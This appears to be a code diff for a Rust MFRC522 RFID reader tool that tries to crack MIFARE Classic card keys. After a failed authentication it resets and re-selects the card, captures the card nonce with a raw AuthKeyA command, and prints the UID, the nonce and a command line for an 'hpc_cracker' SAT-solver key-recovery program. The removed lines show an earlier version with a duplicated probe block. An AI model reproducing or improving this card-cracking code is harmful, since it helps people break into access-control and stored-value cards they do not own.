@@ -109,54 +109,42 @@ fn main() {
                     println!("\n[HPC DATA COLLECTION]");
                     println!("CRACK FAILED. Capture this trace for your HPC SAT Solver:");
                     
-                    // PROBE: Manually request a nonce from the card
-                    let mut cmd = [0x60u8, block, 0, 0]; // 0x60 = AuthKeyA
-                    // We need to calculate CRC for the command
-                    if let Ok(crc) = calculate_crc_manual(&mut mfrc522, &cmd[..2]) {
-                        cmd[2..].copy_from_slice(&crc);
-                        // Send command and wait for 4-byte card nonce (nt)
-                        if let Ok(fifo_data) = mfrc522.transceive::<4>(&cmd, 0, 0) {
-                            println!("UID: {:02X?}", uid.as_bytes());
-                            println!("NT:  {:02X?}", &fifo_data.buffer[..fifo_data.valid_bytes]);
-                            println!("COMMAND: ./hpc_cracker --uid {:08X} --nt {:08X}", 
-                                u32::from_be_bytes(uid.as_bytes()[..4].try_into().unwrap()),
-                                u32::from_be_bytes(fifo_data.buffer[..4].try_into().unwrap())
-                            );
-                        }
-                    }
-                }
-                // ---------------------------------
-
-                let _ = mfrc522.hlta();
-            }
-            Err(_) => {
-                // No card or reading error, continue.
-            }
-        }
-
-        thread::sleep(Duration::from_millis(500));
-    }
-}
-
-                if !authenticated {
-                    println!("\n[HPC DATA COLLECTION]");
-                    println!("CRACK FAILED. Capture this trace for your HPC SAT Solver:");
+                    // We MUST turn off the Crypto1 engine from the failed auths
+                    let _ = mfrc522.stop_crypto1();
                     
-                    // PROBE: Manually request a nonce from the card
-                    let mut cmd = [0x60u8, block, 0, 0]; // 0x60 = AuthKeyA
-                    let crc = calculate_crc_a(&cmd[..2]);
-                    cmd[2..].copy_from_slice(&crc);
+                    // The card goes silent after a failed authentication.
+                    // We must halt it, wake it up, and re-select it before probing!
+                    let _ = mfrc522.hlta();
+                    thread::sleep(Duration::from_millis(20));
 
-                    // Send command and wait for 4-byte card nonce (nt)
-                    if let Ok(fifo_data) = mfrc522.transceive::<4>(&cmd, 0, 0) {
-                        if fifo_data.valid_bytes == 4 {
-                            println!("UID: {:02X?}", uid.as_bytes());
-                            println!("NT:  {:02X?}", &fifo_data.buffer[..4]);
-                            println!("COMMAND: ./hpc_cracker --uid {:08X} --nt {:08X}", 
-                                u32::from_be_bytes(uid.as_bytes()[..4].try_into().unwrap()),
-                                u32::from_be_bytes(fifo_data.buffer[..4].try_into().unwrap())
-                            );
+                    if let Ok(atqa) = mfrc522.wupa() {
+                        if let Ok(_) = mfrc522.select(&atqa) {
+                            // PROBE: Manually request a nonce from the card
+                            let mut cmd = [0x60u8, block, 0, 0]; // 0x60 = AuthKeyA
+                            let crc = calculate_crc_a(&cmd[..2]);
+                            cmd[2..].copy_from_slice(&crc);
+
+                            // Send command and wait for 4-byte card nonce (nt)
+                            match mfrc522.transceive::<4>(&cmd, 0, 0) {
+                                Ok(fifo_data) => {
+                                    if fifo_data.valid_bytes == 4 {
+                                        println!("UID: {:02X?}", uid.as_bytes());
+                                        println!("NT:  {:02X?}", &fifo_data.buffer[..4]);
+                                        println!("COMMAND: ./hpc_cracker --uid {:08X} --nt {:08X}", 
+                                            u32::from_be_bytes(uid.as_bytes()[..4].try_into().unwrap()),
+                                            u32::from_be_bytes(fifo_data.buffer[..4].try_into().unwrap())
+                                        );
+                                    } else {
+                                        println!("Probe failed: Card returned {} bytes instead of 4.", fifo_data.valid_bytes);
+                                    }
+                                },
+                                Err(_) => println!("Probe failed: MFRC522 Transceive error (Timeout/Collision).")
+                            }
+                        } else {
+                            println!("Probe failed: Could not re-select card.");
                         }
+                    } else {
+                        println!("Probe failed: Could not wake up card.");
                     }
                 }
                 // ---------------------------------
